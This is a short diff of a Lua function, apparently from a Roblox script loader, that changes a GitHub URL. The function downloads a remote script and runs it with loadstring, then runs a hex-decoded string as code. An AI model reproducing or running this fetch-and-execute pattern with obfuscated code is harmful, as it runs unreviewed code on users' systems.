@@ -40,7 +40,7 @@ local function DecodeHex(hex)
 end
 
 local function RunWhitelistedScript()
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/ggpp4088/roblox/kts/refs/heads/main/kts.lua'))("")
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/ggpp4088/roblox/refs/heads/main/kts/kts.lua'))("")
     local decoded = DecodeHex(h)
     if decoded then
         loadstring(decoded)()
